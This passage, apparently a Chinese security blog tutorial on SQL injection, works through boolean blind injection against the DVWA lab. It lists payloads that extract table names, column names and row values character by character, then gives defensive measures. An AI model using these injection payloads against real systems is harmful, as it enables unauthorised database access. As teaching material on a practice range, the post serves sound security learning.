+<p>不小于9，小于10可以判断长度为9，然后开始猜名称</p>
+</blockquote>
+<p><code>1&#39; and(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;103#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="1597162797589.png" title="1597162797589" data-fancybox="images"><img src="1597162797589.png" alt="1597162797589" title class></a>
+                <p>1597162797589</p>
+            </figure>
+
+<p><code>1&#39; and(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;104#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="1597162862636.png" title="1597162862636" data-fancybox="images"><img src="1597162862636.png" alt="1597162862636" title class></a>
+                <p>1597162862636</p>
+            </figure>
+
+<blockquote>
+<p>小于103，不小于104，所以是103，对应的ASCII为g，同样方法猜到后面结果为guestbook。然后开始猜字段，这里猜第三个字段</p>
+</blockquote>
+<p><code>1&#39; and (length((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1)))&lt;5#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="1597163115723.png" title="1597163115723" data-fancybox="images"><img src="1597163115723.png" alt="1597163115723" title class></a>
+                <p>1597163115723</p>
+            </figure>
+
+<p><code>1&#39; and (length((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1)))&lt;4#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="1597163128591.png" title="1597163128591" data-fancybox="images"><img src="1597163128591.png" alt="1597163128591" title class></a>
+                <p>1597163128591</p>
+            </figure>
+
+<blockquote>
+<p>小于5不小于4，所以结果是长度是4，然后猜名称</p>
+</blockquote>
+<p><code>1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1),1,1)))&gt;110#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="1597163275391.png" title="1597163275391" data-fancybox="images"><img src="1597163275391.png" alt="1597163275391" title class></a>
+                <p>1597163275391</p>
+            </figure>
+
+<p><code>1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1),1,1)))&gt;109#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="1597163530646.png" title="1597163530646" data-fancybox="images"><img src="1597163530646.png" alt="1597163530646" title class></a>
+                <p>1597163530646</p>
+            </figure>
+
+<blockquote>
+<p>大于109，不大于110，所以是110对应n，依次重复猜到为name，然后开始猜内容长度,这里用=猜</p>
+</blockquote>
+<p><code>1&#39; and (length(( select name from guestbook limit 0,1)))=4#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="1597163675016.png" title="1597163675016" data-fancybox="images"><img src="1597163675016.png" alt="1597163675016" title class></a>
+                <p>1597163675016</p>
+            </figure>
+
+<blockquote>
+<p>猜到4为正确的，所以长度为4，然后猜具体内容</p>
+</blockquote>
+<p><code>1&#39; and (ascii(substr(( select name from guestbook limit 0,1),1,1)))=116#</code></p>
+<p><code>1&#39; and (ascii(substr(( select name from guestbook limit 0,1),2,1)))=101#</code></p>
+<p><code>1&#39; and (ascii(substr(( select name from guestbook limit 0,1),3,1)))=115#</code></p>
+<p><code>1&#39; and (ascii(substr(( select name from guestbook limit 0,1),4,1)))=116#</code></p>
+<blockquote>
+<p>最终猜到guestbook表中的name字段，第一个内容为test</p>
+</blockquote>
+<h5 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h5><figure class="image-box">
+                <a rel=web安全-SQL注入 href="1597162058638.png" title="1597162058638" data-fancybox="images"><img src="1597162058638.png" alt="1597162058638" title class></a>
+                <p>1597162058638</p>
+            </figure>
+
+<blockquote>
+<p>和low注入一样，只不过需要抓包进行数据修改，参数是整数型，不需要闭合，其余不变</p>
+</blockquote>
+<h5 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h5><blockquote>
+<p>和前面一样的作用，只是为了防止自动化SQL注入</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="1597162129663.png" title="1597162129663" data-fancybox="images"><img src="1597162129663.png" alt="1597162129663" title class></a>
+                <p>1597162129663</p>
+            </figure>
+
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
+<li>对用户的输入进行校验通过正则表达式，限制输入长度，对单引号和 双引号等进行转换</li>
+<li>机密信息不要明文存放，采用机密处理</li>
+<li>封装处理异常信息</li>
+<li>不要动态拼接sql语句</li>
+<li>合理设置数据库用户的权限</li>
+</ol>
+<hr>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2021-01-24T05:00:48.206Z" itemprop="dateUpdated">2021-01-24 13:00:48</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2021/01/24/SQL注入/" target="_blank" rel="external">http://wisejay.top/2021/01/24/SQL注入/</a>
+        
+    </div>
+    <footer>
+        <a href="http://wisejay.top">
+            <img src="/img/avatar.jpg" alt="Wisejay">
+            Wisejay
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.top/2021/01/24/SQL注入/&title=《web安全-SQL注入》 — Wisejay&pic=http://wisejay.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.top/2021/01/24/SQL注入/&title=《web安全-SQL注入》 — Wisejay&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2021/01/15/wappalyzer/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">基于wappalyzer编写指纹</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SQL注入"><span class="post-toc-number">1.</span> <span class="post-toc-text">SQL注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#原理"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#注入点判断"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">注入点判断</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#常用函数"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">常用函数</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#注入"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#注入步骤"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">注入步骤</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#联合查询注入"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">联合查询注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#盲注"><span class="post-toc-number">1.4.3.</span> <span class="post-toc-text">盲注</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#布尔类型"><span class="post-toc-number">1.4.3.1.</span> <span class="post-toc-text">布尔类型</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#时间类型"><span class="post-toc-number">1.4.3.2.</span> <span class="post-toc-text">时间类型</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#报错类型"><span class="post-toc-number">1.4.3.3.</span> <span class="post-toc-text">报错类型</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#POST注入"><span class="post-toc-number">1.4.4.</span> <span class="post-toc-text">POST注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#绕过密码认证"><span class="post-toc-number">1.4.4.1.</span> <span class="post-toc-text">绕过密码认证</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#修改数据包"><span class="post-toc-number">1.4.4.2.</span> <span class="post-toc-text">修改数据包</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#其他注入"><span class="post-toc-number">1.4.5.</span> <span class="post-toc-text">其他注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#cookie注入"><span class="post-toc-number">1.4.5.1.</span> <span class="post-toc-text">cookie注入</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#User-Agent注入"><span class="post-toc-number">1.4.5.2.</span> <span class="post-toc-text">User-Agent注入</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Referer注入"><span class="post-toc-number">1.4.5.3.</span> <span class="post-toc-text">Referer注入</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#绕过方式"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">绕过方式</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#大小写绕过"><span class="post-toc-number">1.5.0.1.</span> <span class="post-toc-text">大小写绕过</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#双写关键字绕过"><span class="post-toc-number">1.5.0.2.</span> <span class="post-toc-text">双写关键字绕过</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#编码绕过"><span class="post-toc-number">1.5.0.3.</span> <span class="post-toc-text">编码绕过</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#关键字替换绕过"><span class="post-toc-number">1.5.0.4.</span> <span class="post-toc-text">关键字替换绕过</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#函数替换绕过"><span class="post-toc-number">1.5.0.5.</span> <span class="post-toc-text">函数替换绕过</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#空白符绕过"><span class="post-toc-number">1.5.0.6.</span> <span class="post-toc-text">空白符绕过</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#工具简单使用"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">工具简单使用</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场训练-DVWA"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">靶场训练(DVWA)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#联合注入"><span class="post-toc-number">1.7.0.1.</span> <span class="post-toc-text">联合注入</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#盲注-1"><span class="post-toc-number">1.7.0.2.</span> <span class="post-toc-text">盲注</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#防御"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">防御</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Wisejay &copy; 2019 - 2021
+            </span>
+        		
+           	
+            
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.top/2021/01/24/SQL注入/&title=《web安全-SQL注入》 — Wisejay&pic=http://wisejay.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.top/2021/01/24/SQL注入/&title=《web安全-SQL注入》 — Wisejay&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABwklEQVR42u3awY7DIAxF0fz/T2e2swm9z8Y0lS6rKkrhkAWyja8Lj/vfIE/4m9fEkCtXbpt7LwdZoEZfP39cUa5cuQe5Twjym2yDHG1rg1y5ct/M5YfX07/I/HLlyv1FLs9KeEgkV67ct3FJ8pMWTfhmRnI1uXLlNri8Sjn3e6S+K1eu3BL3Dsf6kOrMjFaXK1fuEW4/sSH0XQmVXLlyz3B5SsNLJ3tTqeC7ypUrdyu3dsm6RqTXq3FEJleu3DEub5VI46Za8TQwyJUr9wi3FkXwBgseEnGPXLlyJ7hpsEKSojSsCUoncuXKPchND7Jas0UaMKGCqVy5cge4/VJp+mbtuVy5ck9y+RUpKVukG0hnlitX7hluJyhJn6fvBKVSuXLlDnA7xZELD14eRX1kcuXKPcJtFSZKrVp8Rbly5X6LuwbxFop+cBPUbOTKlTvAvcPRCVz4dUscJcmVK3crd1fqUluYF1/izciVK7fNJYdXLV2pNXN82IxcuXIPcvlB0wlWNoQycuXKfTGXF1Vr/WIfiiNy5cp9JTedhzeBfZhZrly5B7m1wkeauqTHn1y5cr/FrWUcZEuckn4OuXLljnH/AOV6Kfikh2pnAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.2"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.2"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/haruto.model.json"},"display":{"position":"right","width":212,"height":472},"mobile":{"show":true},"log":false});</script></body>
+</html>
